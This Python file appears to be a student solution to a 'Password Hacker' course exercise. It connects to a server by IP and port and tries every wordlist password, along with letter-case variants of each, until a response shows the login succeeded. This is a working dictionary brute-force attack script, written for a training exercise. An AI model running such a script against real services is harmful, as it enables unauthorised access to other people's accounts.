import socket
from cmdline import get_cmdline_args
from pwd_combi import (ELEMENTS_LIST,
                       verify_pwd_crack,
                       gen_case_combos_for_word,
                       get_pwd_data,
                       )
from socket_conn import socket_operation


def main():
    inputs_cmdline = get_cmdline_args()
    server_data = (inputs_cmdline.ipaddress, inputs_cmdline.port)
    with socket.socket() as client_socket:
        client_socket.connect(server_data)
        for pwd in passwords:
            if pwd.isalpha():
                pwd_combos = gen_case_combos_for_word(pwd)
                for pwd_combo in pwd_combos:
                    response = socket_operation(socket_connection=client_socket,
                                                msg_to_send=pwd_combo)
                    if verify_pwd_crack(msg=response):
                        return pwd_combo
            response = socket_operation(socket_connection=client_socket,
                                        msg_to_send=pwd)
            if verify_pwd_crack(msg=response):
                return pwd


if __name__ == "__main__":
    pwd_file = ("/Users/hello/Desktop/dev/tracks_hs/python_core/Password Hacker (Python)/Password Hacker ("
                "Python)/task/passwords.txt")
    passwords = get_pwd_data(file_path=pwd_file)

    # for stage 2
    all_elements = ELEMENTS_LIST

    print(main())
